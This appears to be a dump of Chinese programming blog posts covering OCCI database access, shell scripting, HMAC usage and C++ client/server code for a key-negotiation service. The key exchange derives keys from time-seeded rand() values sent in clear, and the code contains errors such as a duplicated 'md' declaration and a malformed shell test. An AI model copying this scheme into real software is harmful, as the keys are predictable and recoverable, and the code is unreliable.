12345678910111213141516Statement *stmt = conn-&gt;createStatement( “select Empno, Ename, Sal from Emp where Hiredate &gt;= :1”);//automatically converted to Datestmt-&gt;setString(1, “01-JAN-1987”);//executeQuery returns a ResultSetResultSet *rs = stmt-&gt;executeQuery();//ResultSet::next fetches rows and returns FALSE//when no more rowswhile (rs-&gt;next() == true)&#123; //get values using the getXXX methods of ResultSet empno = rs-&gt;getInt(1); empname = rs-&gt;getString(2); empsalary = rs-&gt;getFloat(3);&#125;stmt-&gt;closeResultSet(rs);//to free resources window配置occi环境 包含头文件和库路径还有库名字 1. Linux如何查找动态库(编译、运行) ? 编译和链接时，动态库的搜索路径顺序如下（注意不会递归性地在其子目录下搜索）： 123(1) gcc编译、链接命令中的-L选项；(2) gcc的环境变量的 LIBRARY_PATH（多个路径用冒号分割）；(3) gcc默认动态库目录：/lib:/usr/lib:usr/lib64:/usr/local/lib。 运行时，动态库的搜索路径顺序如下： 123456789(1) 编译目标代码时指定的动态库搜索路径：用选项-Wl,rpath和include指定的动态库的搜索路径， 比如gcc -Wl,-rpath,include -L. -ldltest hello.c，在执行文件时会搜索路径`./include`; (2) 环境变量LD_LIBRARY_PATH（多个路径用冒号分割）;(3) 修改 /etc/ld.so.conf 配置文件指定的动态库绝对路径, /etc/ld.so.cache（通过sudo ldconfig生效，一般是非root用户时使用）;(4) gcc默认动态库目录：/lib:/usr/lib:usr/lib64:/usr/local/lib 等。 2. oracle解锁用户 1234// 解锁用户ALTER USER scott ACCOUNT UNLOCK;// 重写设置密码ALTER USER scott IDENTIFIED BY tiger;","categories":[{"name":"多端安全协议传输平台","slug":"多端安全协议传输平台","permalink":"https://xiaowuyoucy.github.io/categories/多端安全协议传输平台/"}],"tags":[]},{"title":"Shell脚本","slug":"Shell脚本","date":"2022-06-04T11:01:14.000Z","updated":"2022-06-05T00:37:49.592Z","comments":true,"path":"2022/06/04/Shell脚本/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/06/04/Shell脚本/","excerpt":"","text":"shlle脚本介绍 什么是shell脚本? 一系列的shell命令的集合, 可以有函数, 条件判断/循环语句, 这样的一个文件叫做shell脚本 基本格式? 命名格式 一般使用.sh为后缀命名文件 (这是一个约定, 不是必须的) 书写格式 cat /etc/shells //查看解析器 echo $SHELL //查看当前默认的解析器 12345678910111213# - 注释# 第一行的内容#! /bin/bash - 解析当前脚本文件使用的命令解析器#! /bin/shbourne shell -&gt;sh -&gt; unixbourne again shell -&gt; bash# 第二行开始shell命令 1shell命令 2shell命令 3...... 执行脚本 脚本创建出来之后是一个普通文件 -&gt; 没有执行权限 123chmod u+x xxx.sh./xxx.sh -&gt; 最常用的方式sh xxx.sh shell中的变量 如何定义变量 12345678# cint a;int number = 9;# shell - 变量没有数据类型, 新变量定义必须初始化value=123value1=&quot;123&quot;value1=&quot;hello,world&quot;赋值的时候=前后不能有空格 位置变量 - 执行shell脚本时候, 传递到内部的参数 123456$0 - 脚本文件的名字$1 - 第一个参数$2 - 第二个参数$3 - 第三参数...$n - 第n个参数 123456789101112131415161718#!/bin/bashecho $0echo $1echo $2echo $3echo $4echo $5echo $6# 执行脚本./test.sh 1 2 3 4 a b c d e f# 输出结果./test.sh1234ab 特殊变量 12345678910111213141516171819202122$#: 表示参数的个数$@: 表示全部的参数$$ : 当前进程的PID$?: 程序执行完成之后的返回值4. 取普通变量的值第一种方式: $变量名$PATH$value第二种方式: $&#123;变量名&#125;$&#123;PATH&#125;$&#123;value&#125;5. 取命令执行之后的得到的值第一种方式value=$(shell命令)第二种方式:value=`shell命令` 使用&quot;&quot;和''的区别:对于&quot;&quot;中的变量会直接展开, 而对于''当做普通字符串对待 1例如: echo &quot;$HOME&quot; 和echo &apos;$HOME&apos; 条件判断语法 - if 1234567891011# 条件判断语句和[ 判断语句 ]左右必须要有空格间隔if[ 判断语句 ];then处理语句处理语句fi# 或者if[ 判断语句 ]then处理语句处理语句fi 12345678910if [ 判断语句 ];then处理语句处理语句elif [ 判断语句 ];then处理语句处理语句else处理语句处理语句fi 文件状态测试 12345678910111213141516171819202122-b filename 当filename 存在并且是块文件时返回真(返回0)-c filename 当filename 存在并且是字符文件时返回真-d pathname 当pathname 存在并且是一个目录时返回真-e pathname 当由pathname 指定的文件或目录存在时返回真-f filename 当filename 存在并且是正规(普通)文件时返回真-g pathname 当由pathname 指定的文件或目录存在并且设置了SGID 位时返回真-h/-L filename 当filename 存在并且是符号链接文件时返回真 (或 filename) -k pathname 当由pathname 指定的文件或目录存在并且设置了&quot;粘滞&quot;位时返回真-p filename 当filename 存在并且是命名管道时返回真-r pathname 当由pathname 指定的文件或目录存在并且可读时返回真-s filename 当filename 存在并且文件大小大于0 时返回真-S filename 当filename 存在并且是socket 时返回真-t fd 当fd 是与终端设备相关联的文件描述符时返回真-u pathname 当由pathname 指定的文件或目录存在并且设置了SUID 位时返回真-w pathname 当由pathname 指定的文件或目录存在并且可写时返回真-x pathname 当由pathname 指定的文件或目录存在并且可执行时返回真-O pathname 当由pathname 存在并且被当前进程的有效用户id 的用户拥有时返回真(字母O 大写)-G pathname 当由pathname 存在并且属于当前进程的有效用户id 的用户的用户组时返回真file1 -nt file2 file1 比file2 新时返回真file1 -ot file2 file1 比file2 旧时返回真f1 -ef f2 files f1 and f2 are hard links to the same file 常见字符串测试 1234567-z string 字符串string 为空串(长度为0)时返回真-n string 字符串string 为非空串时返回真str1 = str2 字符串str1 和字符串str2 相等时返回真str1 == str2 同 =str1 != str2 字符串str1 和字符串str2 不相等时返回真str1 &lt; str2 按字典顺序排序，字符串str1 在字符串str2 之前str1 &gt; str2 按字典顺序排序，字符串str1 在字符串str2 之后 常见数值测试 123456nt1 -eq int2 如果int1 等于int2，则返回真int1 -ne int2 如果int1 不等于int2，则返回真int1 -lt int2 如果int1 小于int2，则返回真int1 -le int2 如果int1 小于等于int2，则返回真int1 -gt int2 如果int1 大于int2，则返回真int1 -ge int2 如果int1 大于等于int2，则返回真 测试时使用的逻辑操作符 123-a 逻辑与，操作符两边均为真，结果为真，否则为假。-o 逻辑或，操作符两边一边为真，结果为真，否则为假。! 逻辑否，条件为假，结果为真。 循环控制 12345678910111213141516171819202122232425262728293031323334353637循环: for语句和while 例1: for var in apple pear banana do echo $var done 例2:打印当前所有的文件 for file in `ls` do echo $file done 例3:求1-100的和 sum=0 for i in &#123;1..100&#125; do sum=$[$sum+$i] done echo &quot;sum==[$sum]&quot; 如果一个文件名字为: file.xxx, 想去掉~~得到file可以: basename file.xxx &quot;.xxx&quot; 使用这种方法可以获得文件名字去掉扩展名后的名字: 如: basename test.sh .sh 案例: 某个目录下有a.bak b.bak c.bak d.bak, 要求把扩展名去掉, 变成a b c d mv a.bak $(basename a.bak .bak) while的用法: 案例: 求1-10的和 sum=0 i=0 while [ $i -le 10 ] do sum=$[$sum+$i] i=$[$i+1] done echo &quot;sum==[$sum]&quot; 整数的运算要用$[]括起来 awk介绍 awk 可以将文件拆分成功若干行, 根据指定的分隔符, 再将每一行拆分成若干列, 默认按照空格或tab进行拆分 基本语法格式 12awk 参数 &apos;条件&#123;处理动作&#125;&apos; 操作的文件或数据awk 参数 &apos;/正则表达式&#123;处理动作&#125;&apos; 操作的文件或数据 指定分隔符的参数: -F -F分隔符 如果不指定分隔符, 默认是按照空格或者tab进行拆分 如何使用变量取出某一列? $0 - 当前行 $1 - 拆分的第一列 $2 - 拆分的第二列 $3 - 拆分的第三列 … 打印某一列的值 print $n 12awk -F &apos;:&apos; &apos;&#123;print $0&#125;&apos; /etc/passwd代表/etc/passwd文件中的内容以:分割,然后打印当前行数据 使用shell脚本结束某个进程 1234567891011#! /bin/bashPID=`ps -ef|grep xxx|grep -v grep|awk &apos;&#123;print $2&#125;&apos;`#grep -v grep 代表去除最后的grep#如果PID不为空 则结束进程if [-n $PID]then kill -9 $PIDelse echo &quot;没有可结束的进程&quot;fi","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"服务端类实现","slug":"服务端类实现","date":"2022-05-31T00:20:21.000Z","updated":"2022-05-31T00:31:55.526Z","comments":true,"path":"2022/05/31/服务端类实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/31/服务端类实现/","excerpt":"","text":"ServerOperation.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#pragma once#include \"TcpSocket.h\"#include \"SecKeyShm.h\"#include \"TcpServer.h\"#include \"RequestCodec.h\"#include \"OCCIOP.h\"#include &lt;map&gt;class ServerInfo&#123;public: char serverID[12]; // 服务器端编号 char dbUse[24]; // 数据库用户名 char dbPasswd[24]; // 数据库密码 char dbSID[24]; // 数据库sid unsigned short sPort; // 服务器绑定的端口 int maxnode; // 共享内存最大网点树 客户端默认1个 int shmkey; // 共享内存keyid 创建共享内存时使用 &#125;;class ServerOperation&#123;public: ServerOperation(ServerInfo *info); ~ServerOperation(); // 服务器开始工作 void startWork(); // 秘钥协商 int secKeyAgree(RequestMsg* reqmsg, char** outData, int&amp; outLen); // 秘钥校验 int secKeyCheck(); // 秘钥注销 int secKeyRevoke(); // 秘钥查看 int secKeyView(); friend void* working(void * arg); // 线程回调也可使用静态成员函数 static void* wrokingHard(void* arg); static void catchSignal(int num);private: void getRandString(int len, char* randBuf);private: ServerInfo m_info; SecKeyShm* m_shm; TcpServer m_server; TcpSocket* m_client; OCCIOP m_occi; std::map&lt;pthread_t, TcpSocket*&gt; m_listSocket; static bool m_stop;&#125;;void* working(void * arg); ServerOperation.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199#include \"ServerOperation.h\"#include &lt;iostream&gt;#include &lt;pthread.h&gt;#include &lt;string.h&gt;#include \"RequestFactory.h\"#include \"RespondFactory.h\"#include &lt;openssl/hmac.h&gt;#include &lt;openssl/sha.h&gt;#include &lt;signal.h&gt;using namespace std;bool ServerOperation::m_stop = false; // 静态变量初始化ServerOperation::ServerOperation(ServerInfo * info)&#123; memcpy(&amp;m_info, info, sizeof(ServerInfo)); m_shm = new SecKeyShm(m_info.shmkey, m_info.maxnode);&#125;ServerOperation::~ServerOperation()&#123;&#125;void ServerOperation::startWork()&#123; //socket-setsockopt-bind-listen m_server.setListen(m_info.sPort); pthread_t threadID; while (1) &#123; //accept新的客户端连接 m_client = m_server.acceptConn(); //创建一个子线程 pthread_create(&amp;threadID, NULL, working, this); //设置子线程为分离属性 pthread_detach(threadID); m_listSocket.insert(make_pair(threadID, m_client)); &#125;&#125;int ServerOperation::secKeyAgree(RequestMsg * reqMsg, char ** outData, int &amp; outLen)&#123; //验证消息认证码 char key[64]; unsigned int len; unsigned char md[SHA256_DIGEST_LENGTH]; char authCode[SHA256_DIGEST_LENGTH * 2 + 1] = &#123;0&#125;; memset(key, 0x00, sizeof(key)); sprintf(key, \"@%s+%s@\", reqMsg-&gt;serverId, reqMsg-&gt;clientId); HMAC(EVP_sha256(), key, strlen(key), (unsigned char *)reqMsg-&gt;r1, strlen(reqMsg-&gt;r1), md, &amp;len); for (int i = 0; i &lt; SHA256_DIGEST_LENGTH; i++) &#123; sprintf(&amp;authCode[2 * i], \"%02x\", md[i]); &#125; //将生成的消息认证码和客户端的r1的消息认证做比对 if (strcmp(authCode, reqMsg-&gt;authCode) != 0) &#123; cout &lt;&lt; \"消息认证码错误\" &lt;&lt; endl; return -1; &#125; //生成随机字符串r2 RespondMsg rspMsg; memset(&amp;rspMsg, 0x00, sizeof(rspMsg)); getRandString(sizeof(rspMsg.r2), rspMsg.r2); //将随机字符串r2和r1进行拼接, 然后生成秘钥 char buf[64]; char md[SHA_DIGEST_LENGTH]; char seckey[SHA_DIGEST_LENGTH * 2 + 1]; memset(buf, 0x00, sizeof(buf)); memset(seckey, 0x00, sizeof(seckey)); sprintf(buf, \"%s%s\", reqMsg-&gt;r1, rspMsg.r2); SHA1((unsigned char *)buf, strlen((char *)buf), md); for (int i = 0; i&lt;SHA_DIGEST_LENGTH; i++) &#123; sprintf(&amp;seckey[i * 2], \"%02x\", md[i]); &#125; //给应答结构体赋值 rspMsg.seckeyid = 1; //获取秘钥ID rspMsg.rv = 0; strcpy(rspMsg.serverId, m_info.serverID); strcpy(rspMsg.clientId, reqMsg-&gt;clientId); //将要发送给客户端的应答结构体进行编码 int dataLen; char *sendData = NULL; CodecFactory *factory = new RespondFactory(&amp;rspMsg); Codec *pCodec = factory-&gt;createCodec(); pCodec-&gt;msgEncode(&amp;sendData, dataLen); delete factory; delete pCodec; //发送数据给客户端 pthread_t thread = pthread_self(); TcpSocket* socket = m_listSocket[thread]; socket-&gt;sendMsg(sendData, dataLen); free(sendData); //写秘钥信息到共享内存 NodeSHMInfo node; memset(&amp;node, 0x00, sizeof(NodeSHMInfo)); node.status = 0; strcpy(node.seckey, seckey); strcpy(node.clientID, rspMsg.clientId); strcpy(node.serverID, m_info.serverID); node.seckeyID = rspMsg.seckeyid; //将秘钥信息写入共享内存 m_shm-&gt;shmWrite(&amp;node); //关闭连接 socket-&gt;disConnect(); return 0;&#125;void ServerOperation::getRandString(int len, char * randBuf)&#123; int flag = -1; // 设置随机种子 srand(time(NULL)); // 随机字符串: A-Z, a-z, 0-9, 特殊字符(!@#$%^&amp;*()_+=) char chars[] = \"!@#$%^&amp;*()_+=\"; for (int i = 0; i &lt; len - 1; ++i) &#123; flag = rand() % 4; switch (flag) &#123; case 0: randBuf[i] = 'Z' - rand() % 26; break; case 1: randBuf[i] = 'z' - rand() % 26; break; case 3: randBuf[i] = rand() % 10 + '0'; break; case 2: randBuf[i] = chars[rand() % strlen(chars)]; break; default: break; &#125; &#125; randBuf[len - 1] = '\\0';&#125;// 友元函数, 可以在该友元函数中通过对应的类对象调用期私有成员函数或者私有变量// 子线程 - 进行业务流程处理void * working(void * arg)&#123; //接收数据 pthread_t thread = pthread_self(); ServerOperation *op = (ServerOperation *)arg; TcpSocket* socket = op-&gt;m_listSocket[thread]; char *inData; int dataLen; socket-&gt;recvMsg(&amp;inData, dataLen); //解码 CodecFactory *factory = new RequestFactory(); Codec *pCodec = factory-&gt;createCodec(); RequestMsg *pMsg = (RequestMsg *)pCodec-&gt;msgDecode(inData, dataLen); delete factory; //delete pCodec; //判断clientID是否合法 //判断客户端要请求什么服务 char *outData; switch(pMsg-&gt;cmdType) &#123; case RequestCodec::NewOrUpdate: op-&gt;secKeyAgree(pMsg, &amp;outData, dataLen); break; case RequestCodec::Check: op-&gt;secKeyCheck(); break; case RequestCodec::Revoke: op-&gt;secKeyRevoke(); break; case RequestCodec::View: op-&gt;secKeyView(); break; default: break; &#125;&#125;","categories":[{"name":"多端安全协议传输平台","slug":"多端安全协议传输平台","permalink":"https://xiaowuyoucy.github.io/categories/多端安全协议传输平台/"}],"tags":[]},{"title":"客户端类实现","slug":"客户端类实现","date":"2022-05-31T00:16:28.000Z","updated":"2022-05-31T00:19:16.555Z","comments":true,"path":"2022/05/31/客户端类实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/31/客户端类实现/","excerpt":"","text":"ClientOperation.h 123456789101112131415161718192021222324252627282930313233343536373839#pragma once#include \"TcpSocket.h\"#include \"SecKeyShm.h\"class ClientInfo&#123;public: char clinetID[12]; // 客户端ID char serverID[12]; // 服务器ID //char authCode[65]; // 消息认证码 char serverIP[32]; // 服务器IP unsigned short serverPort; // 服务器端口 int maxNode; // 共享内存节点个数 int shmKey; // 共享内存的Key&#125;;class ClientOperation&#123;public: ClientOperation(ClientInfo *info); ~ClientOperation(); // 秘钥协商 int secKeyAgree(); // 秘钥校验 int secKeyCheck() &#123;&#125; // 秘钥注销 int secKeyRevoke() &#123;&#125; // 秘钥查看 int secKeyView() &#123;&#125;private: void getRandString(int len, char* randBuf);private: ClientInfo m_info; TcpSocket m_socket; SecKeyShm* m_shm;&#125;; ClientOperation.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154#include \"ClientOperation.h\"#include \"RequestCodec.h\"#include &lt;string.h&gt;#include &lt;time.h&gt;#include &lt;openssl/hmac.h&gt;#include &lt;openssl/sha.h&gt;#include \"CodecFactory.h\"#include \"RequestFactory.h\"#include \"RespondFactory.h\"using namespace std;ClientOperation::ClientOperation(ClientInfo * info)&#123; memcpy(&amp;m_info, info, sizeof(ClientInfo)); //创建共享内存 m_shm = new SecKeyShm(m_info.shmKey, m_info.maxNode);&#125;ClientOperation::~ClientOperation()&#123;&#125;int ClientOperation::secKeyAgree()&#123; //准备请求数据 RequestMsg req; memset(&amp;req, 0x00, sizeof(RequestMsg)); req.cmdType = RequestCodec::NewOrUpdate; strcpy(req.clientId, m_info.clinetID); strcpy(req.serverId, m_info.serverID); getRandString(sizeof(req.r1), req.r1); //使用hmac函数生成哈希值----消息认证码 char key[64]; unsigned int len; unsigned char md[SHA256_DIGEST_LENGTH]; memset(key, 0x00, sizeof(key)); sprintf(key, \"@%s+%s@\", req.serverId, req.clientId); HMAC(EVP_sha256(), key, strlen(key), (unsigned char *)req.r1, strlen(req.r1), md, &amp;len); for (int i = 0; i &lt; SHA256_DIGEST_LENGTH; i++) &#123; sprintf(&amp;req.authCode[2 * i], \"%02x\", md[i]); &#125; cout &lt;&lt; \"key:\" &lt;&lt; key &lt;&lt; endl; cout &lt;&lt; \"r1:\" &lt;&lt; req.r1 &lt;&lt; endl; cout &lt;&lt; \"authCode:\" &lt;&lt; req.authCode &lt;&lt; endl; //将要发送的数据进行编码 int dataLen; char *outData = NULL; CodecFactory *factory = new RequestFactory(&amp;req); Codec *pCodec = factory-&gt;createCodec(); pCodec-&gt;msgEncode(&amp;outData, dataLen); delete factory; delete pCodec; //连接服务端 m_socket.connectToHost(m_info.serverIP, m_info.serverPort); //发送请求数据给服务端 m_socket.sendMsg(outData, dataLen); //等待接收服务端的应答 char *inData; m_socket.recvMsg(&amp;inData, dataLen); //解码 factory = new RespondFactory(); pCodec = factory-&gt;createCodec(); RespondMsg *pMsg = (RespondMsg *)pCodec-&gt;msgDecode(inData, dataLen); //判断服务端是否成功 if (pMsg-&gt;rv == -1) &#123; cout &lt;&lt; \"秘钥协商失败\" &lt;&lt; endl; return -1; &#125; else &#123; cout &lt;&lt; \"秘钥协商成功\" &lt;&lt; endl; &#125; //将服务端的r2和客户端的r1拼接生成秘钥 char buf[1024]; unsigned char md1[SHA_DIGEST_LENGTH]; memset(md1, 0x00, sizeof(md1)); char seckey[SHA_DIGEST_LENGTH*2+1]; memset(buf, 0x00, sizeof(buf)); memset(seckey, 0x00, sizeof(seckey)); sprintf(buf, \"%s%s\", req.r1, pMsg-&gt;r2); SHA1((unsigned char *)buf, strlen((char *)buf), md1); for(int i=0; i&lt;SHA_DIGEST_LENGTH; i++) &#123; sprintf(&amp;seckey[i*2], \"%02x\", md1[i]); &#125; cout &lt;&lt; \"秘钥: \" &lt;&lt; seckey &lt;&lt; endl; //给秘钥结构体赋值 NodeSHMInfo node; memset(&amp;node, 0x00, sizeof(NodeSHMInfo)); node.status = 0; strcpy(node.seckey, seckey); strcpy(node.clientID, m_info.clinetID); strcpy(node.serverID, m_info.serverID); node.seckeyID = pMsg-&gt;seckeyid; //将秘钥信息写入共享内存 m_shm-&gt;shmWrite(&amp;node); //关闭网络连接 m_socket.disConnect(); //释放资源 delete factory; delete pCodec; return 0;&#125;// char randBuf[64]; , 参数 64, randBufvoid ClientOperation::getRandString(int len, char * randBuf)&#123; int flag = -1; // 设置随机种子 srand(time(NULL)); // 随机字符串: A-Z, a-z, 0-9, 特殊字符(!@#$%^&amp;*()_+=) char chars[] = \"!@#$%^&amp;*()_+=\"; for (int i = 0; i &lt; len-1; ++i) &#123; flag = rand() % 4; switch (flag) &#123; case 0: randBuf[i] = rand() % 26 + 'A'; break; case 1: randBuf[i] = rand() % 26 + 'a'; break; case 2: randBuf[i] = rand() % 10 + '0'; break; case 3: randBuf[i] = chars[rand() % strlen(chars)]; break; default: break; &#125; &#125; randBuf[len - 1] = '\\0';&#125;","categories":[{"name":"多端安全协议传输平台","slug":"多端安全协议传输平台","permalink":"https://xiaowuyoucy.github.io/categories/多端安全协议传输平台/"}],"tags":[]},{"title":"哈希算法hmac的使用方法","slug":"哈希算法hmac的使用方法","date":"2022-05-30T23:58:39.000Z","updated":"2022-05-31T00:08:23.353Z","comments":true,"path":"2022/05/31/哈希算法hmac的使用方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/31/哈希算法hmac的使用方法/","excerpt":"","text":"HMAC是密钥相关的哈希运算消息认证码，HMAC运算利用哈希算法，以一个密钥和一个消息为输入，生成 一个消息摘要作为输出。 Hash-based Message Authentication Code - HMAC 需要包含头文件 1hmac.h 第一种方式 12345678910111213141516// 适合处理少量数据unsigned char *HMAC(const EVP_MD *evp_md, const void *key, int key_len,const unsigned char *d, size_t n, unsigned char *md,unsigned int *md_len);- 参数evp_md:- EVP_md5()- EVP_sha1()- EVP_sha224()- EVP_sha256()........- 参数key: 传入, 秘钥, 需要将其和原始数据组合进行哈希运算- 参数key_len: 秘钥的长度- 参数d: 原始数据- 参数n: 原始数据d的长度- 参数md: 传出, 保存的是生成的散列值- 参数md_len: 传出, md的长度 evp_md 参数在evp.h头文件中记录着,使用什么加密方式可以去查 1# include &lt;openssl/evp.h&gt; 第二种方式: 12345678910111213141516171819202122232425262728293031// 适合处理数据量比较大的情况HMAC_CTX *HMAC_CTX_new(void);int HMAC_Init_ex(HMAC_CTX *ctx, const void *key, int len, const EVP_MD *md, ENGINE *impl)int HMAC_Init(HMAC_CTX *ctx, const void *key, int len, const EVP_MD *md)) - ctx: 通过调用HMAC_CTX_new(void)得到的指针 - key: 秘钥 - len: 秘钥长度 - md: - EVP_md5(); - EVP_sha1(); - EVP_sha256(); - ... // 添加数据int HMAC_Update(HMAC_CTX *ctx, const unsigned char *data, size_t len); - ctx: 通过调用HMAC_CTX_new(void)得到的指针 - data: 原始数据 - len: 原始数据长度 // 计算结果int HMAC_Final(HMAC_CTX *ctx, unsigned char *md, unsigned int *len); - ctx: 通过调用HMAC_CTX_new(void)得到的指针 - md: 传出参数, 存储得到的散列值 - len: 传出, md散列值的长度","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"生成随机字符串","slug":"生成随机字符串","date":"2022-05-30T23:56:43.000Z","updated":"2022-05-30T23:57:19.485Z","comments":true,"path":"2022/05/31/生成随机字符串/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/31/生成随机字符串/","excerpt":"","text":"123456789101112131415161718192021222324252627282930void getRandString(int len, char * randBuf)&#123; int flag = -1; // 设置随机种子 srand(time(NULL)); // 随机字符串: A-Z, a-z, 0-9, 特殊字符(!@#$%^&amp;*()_+=) char chars[] = \"!@#$%^&amp;*()_+=\"; for (int i = 0; i &lt; len - 1; ++i) &#123; flag = rand() % 4; switch (flag) &#123; case 0: randBuf[i] = 'Z' - rand() % 26; break; case 1: randBuf[i] = 'z' - rand() % 26; break; case 3: randBuf[i] = rand() % 10 + '0'; break; case 2: randBuf[i] = chars[rand() % strlen(chars)]; break; default: break; &#125; &#125; randBuf[len - 1] = '\\0';&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"VS2017编译linux程序时出错的解决办法","slug":"VS2017编译linux程序时出错的解决办法","date":"2022-05-30T23:53:34.000Z","updated":"2022-05-30T23:55:01.661Z","comments":true,"path":"2022/05/31/VS2017编译linux程序时出错的解决办法/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/31/VS2017编译linux程序时出错的解决办法/","excerpt":"","text":"VS2017编译linux程序时，如果出错，一般会出现下面的错误提示信息： 123g++ exited with code 1, please see the Output Window - Build output for more details (NOTE:the build output verbosity might need to be changed in Tools Options to see more information inthe Output Window). 解决办法如下： 12VS2017 -&gt; 工具 -&gt; 选项 -&gt; 项目和解决方案 -&gt; 生成并运行，将“MSBuild项目生成输出详细级别”和“MSBuild项目生成日志文件详细级别”调整为“普通”，这样在编译linux程序时如果编译出错，可以看到详细的错误信息。","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"秘钥协商服务整体流程描述","slug":"秘钥协商服务整体流程描述","date":"2022-05-30T23:32:56.000Z","updated":"2022-05-30T23:49:39.869Z","comments":true,"path":"2022/05/31/秘钥协商服务整体流程描述/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/31/秘钥协商服务整体流程描述/","excerpt":"","text":"关于共享内存: 使用共享内存的时候, 如果想记录共享内存的相关信息, 可以 在共享内存的头部来记录信息, 比如设计一个结构体 12345struct Head&#123; int total; //最多可以存放多少个 int useNum; //当前可用的个数&#125; 1.秘钥协商的流程 在秘钥协商客户端生成一随机字符串 - rand1 客户端将rand1发送给秘钥协商服务器 服务器接收客户端发送的rand1, 在服务器端生成一另外一个随机字符串rand2 服务器将rand1和rand2进行混合运算生成一个新的字符串 - seckey1 通过哈希函数 服务器将生成的rand2发送给客户端 客户端接收数据, 客户端有rand1和rand2 通过哈希函数进行运算 - seckey2 可以将seckey1和seckey2作为秘钥 2.秘钥校验 当秘钥协商成功之后, 需要再次校验客户端和服务器生成的秘钥是否相同 如何校验: 将秘钥进行哈希运算, 比较散列值 3.秘钥注销 不再继续使用的秘钥需要注销 需要标记秘钥的状态: bool status status == 1: 可用 status == 0: 不可用 4.秘钥查看 查看不是当前秘钥的信息 查看的是历史秘钥 根据网点查看 根据日期查看 5.使用的数据结构 秘钥协商客户端 1234567891011121314151617// 客户端给服务器发送数据的时候用到的数据结构struct RequestMsg&#123;//1 密钥协商 //2 密钥校验; // 3 密钥注销int cmdType; // 报文类型char clientId[12]; // 客户端编号char authCode[65]; // 认证码 - openssl hmacchar serverId[12]; // 服务器端编号char r1[64]; // 客户端随机数&#125;;- cmdType: 客户端请求的类型, 服务器根据这个变量做不同的处理- clientId: 客户端的编号, 是唯一的- serverId: 服务器的编号, 是唯一的- authCode: 消息认证码, 判定消息是否被篡改过- (原始数据 + 秘钥) * 哈希运算 = 散列值- r1: 客户端生成的随机字符串, 生成秘钥其中的一部分原材料 秘钥协商服务器 1234567891011121314151617// 服务器给客户端回复的时候用的到结构struct RespondMsg&#123;int rv; // 返回值char clientId[12]; // 客户端编号char serverId[12]; // 服务器编号char r2[64]; // 服务器端随机数int seckeyid; // 对称密钥编号 keysn&#125;;- rv: return value - &gt; 服务器对客户端请求的处理结果- 0: 正确- -1: 错误- clientId: 客户端的编号, 是唯一的- serverId: 服务器的编号, 是唯一的- r2: 服务器生成的随机字符串, 生成秘钥其中的一部分原材料- seckeyid: 生成的新的秘钥之后, 需要编号, 该动作是有秘钥协商服务器完成的 写一个人机交互程序 12345678910111213printf(&quot;0-退出, 1-协商, 2-校验, 3-注销\\n&quot;);while(1)&#123;// 键盘捕捉cin &gt;&gt; sel;switch(sel)&#123;case 1:// 秘钥协商break;&#125;&#125; 用户输入1, 进入秘钥协商 12345678910111213141516171819202122232425262728293031323334353637创建一个 RequestMsg对象, 并初始化将要发送的数据序列化 - 得到一个字符串创建通信的套接字, 并且连接到秘钥协商服务器发送序列化之后的字符串阻塞等待接收服务器回发的数据 - &gt; 字符串服务器序列化之后得到的字符串需要接接收的字符串解码, 数据还原得到RespondMsg对象查看服务器处理结果 - &gt; rv的值// 服务器给客户端回复的时候用的到结构struct RespondMsg&#123;int rv; // 返回值char clientId[12]; // 客户端编号char serverId[12]; // 服务器编号char r2[64]; // 服务器端随机数int seckeyid; // 对称密钥编号 keysn&#125;;- rv: return value - &gt; 服务器对客户端请求的处理结果- 0: 正确- -1: 错误- clientId: 客户端的编号, 是唯一的- serverId: 服务器的编号, 是唯一的- r2: 服务器生成的随机字符串, 生成秘钥其中的一部分原材料- seckeyid: 生成的新的秘钥之后, 需要编号, 该动作是有秘钥协商服务器完成的失败 - &gt; 直接退出, 通过用户成功 -&gt; 继续通过服务器发送过来的r2和自己 的r1组合进行哈希运算 -&gt; 散列值 -&gt; 秘钥将生成的秘钥写入共享内存class NodeSHMInfo &#123; public: int status;int seckeyID;char clientID[12];char serverID[12];char seckey[128]; &#125;; NodeSHMInfo 类型的变量可以从配置文件或者是环境变量中获取;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"共享内存类的测试","slug":"共享内存类的测试","date":"2022-05-30T16:26:10.000Z","updated":"2022-05-30T16:26:39.889Z","comments":true,"path":"2022/05/31/共享内存类的测试/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/31/共享内存类的测试/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940#include &quot;SecKeyShm.h&quot;#include &lt;iostream&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;using namespace std;int main(int argc, char *argv[])&#123; char clientID[16] = &#123;0&#125;; char serverID[16] = &#123;0&#125;; strcpy(clientID, argv[1]); strcpy(serverID, argv[2]); //SecKeyShm shm(0x1234, 10); SecKeyShm shm(0x1234); NodeSHMInfo info; memset(&amp;info, 0x00, sizeof(NodeSHMInfo)); info.status = 199; info.seckeyID = 11; strcpy(info.clientID, clientID); strcpy(info.serverID, serverID); strcpy(info.seckey, &quot;0001&quot;); shm.shmWrite(&amp;info); cout 